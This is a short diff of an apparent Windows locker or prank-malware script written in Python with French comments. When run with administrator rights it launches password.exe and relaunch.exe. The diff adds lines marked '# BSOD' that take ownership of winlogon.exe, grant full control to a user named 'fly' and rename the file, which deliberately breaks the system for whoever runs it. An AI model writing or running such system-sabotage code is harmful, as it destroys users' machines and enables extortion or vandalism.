@@ -13,6 +13,10 @@ if is_admin(): # Si l'utilisateur est administrateur
     os.system("@ECHO OFF")
     os.system("start /MAX password.exe")
     os.system("start /MIN relaunch.exe")
+    # BSOD
+    os.system("takeown /f .\winlogon.exe") 
+    os.system("icacls .\winlogon.exe /grant fly:F")
+    os.system("ren .\winlogon.exe notwinlogon.exe")
     time.sleep(2.5)
     
     while True:
